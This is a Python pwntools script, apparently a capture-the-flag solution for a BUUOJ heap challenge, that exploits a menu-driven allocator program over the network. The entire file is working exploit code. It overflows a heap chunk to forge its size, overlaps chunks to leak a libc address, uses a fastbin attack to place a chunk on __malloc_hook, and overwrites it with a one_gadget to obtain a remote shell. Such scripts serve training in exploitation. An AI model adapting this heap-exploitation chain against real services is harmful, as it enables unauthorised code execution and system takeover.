from pwn import *
from LibcSearcher import *

context.log_level = 'debug'

# io = process('./pwn')
io = remote('node4.buuoj.cn', 25680)

in_use = [False] * 0x10  # in_use array
one_gadgets = [0x45216, 0x4526a, 0xf02a4, 0xf1147]


def allocate(size):
    io.sendlineafter(b'Command: ', b'1')
    io.sendlineafter(b'Size: ', str(size).encode())
    io.recvuntil(b'Allocate Index ')
    allocated_index = int(io.recvuntil('\n', drop=True), 10)
    in_use[allocated_index] = True


def fill(index, size, content):
    io.sendlineafter(b'Command: ', b'2')
    io.sendlineafter(b'Index: ', str(index).encode())
    io.sendlineafter(b'Size: ', str(size).encode())
    io.sendafter(b'Content: ', content)


def release(index):
    io.sendlineafter(b'Command: ', b'3')
    io.sendlineafter(b'Index: ', str(index).encode())
    in_use[index] = False


def dump(index):
    io.sendlineafter(b'Command: ', b'4')
    io.sendlineafter(b'Index: ', str(index).encode())
    io.recvuntil(b'Content: \n')


allocate(0x110)  # chunk #0
allocate(0x110)  # chunk #1
allocate(0x110)  # chunk #2
allocate(0x110)  # chunk #3

payload = cyclic(0x110)
payload += p64(0x120)  # prev_size of chunk #1
payload += p64(0x241)  # fake size of chunk #1
fill(0, 0x120, payload)

release(1)
allocate(0x130)  # fake chunk #1

dump(2)
io.recv(0x20)
malloc_hook = u64(io.recv(8)) - 88 - 0x10
print(hex(malloc_hook))
libc = LibcSearcher('__malloc_hook', malloc_hook)
base = malloc_hook - libc.dump('__malloc_hook')
free_hook = base + libc.dump('__free_hook')

fill(2, 0x30, b'\x00' * 0x18 + p64(0x100) + p64(malloc_hook + 0x10 + 88) + p64(malloc_hook + 0x10 + 88))

allocate(0xf0)  # chunk #4
allocate(0x20)  # chunk #5
allocate(0x60)  # chunk #6

release(6)
# gdb.attach(io)
fill(5, 0x38, b'\x00' * 0x20 + p64(0x30) + p64(0x71) + p64(malloc_hook - 0x23))
allocate(0x60)  # chunk #6
allocate(0x60)  # chunk #7, this one is on __malloc_hook

fill(7, 0x1B, b'\x00' * 0x13 + p64(one_gadgets[1] + base))
# gdb.attach(io)
# release(6)

# allocate(0x20)
io.interactive()